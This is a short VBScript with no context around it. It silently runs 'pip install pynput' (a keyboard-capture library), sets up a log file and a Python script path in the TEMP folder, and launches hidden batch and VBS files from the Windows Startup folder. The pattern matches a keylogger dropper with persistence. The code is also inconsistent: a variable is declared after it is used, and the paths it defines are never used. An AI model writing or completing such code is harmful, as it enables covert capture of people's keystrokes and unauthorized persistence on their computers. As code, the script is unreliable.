Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Dim objShell

' Define the TEMP folder path
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
logFile = tempPath & "\log.txt"

' Install pynput in the background
objShell.Run "cmd /c ""pip install pynput""", 0, True

' Define the path to the Python script in the TEMP directory
pythonScript = tempPath & "\a.py"



Set objShell = CreateObject("WScript.Shell")

' Get the Startup folder path
StartupFolder = objShell.SpecialFolders("Startup")

' Run file2.bat from the Startup folder
objShell.Run Chr(34) & StartupFolder & "\file2.bat" & Chr(34), 0, False

' Run file.vbs from the Startup folder
objShell.Run Chr(34) & StartupFolder & "\file.vbs" & Chr(34), 0, False

Set objShell = Nothing
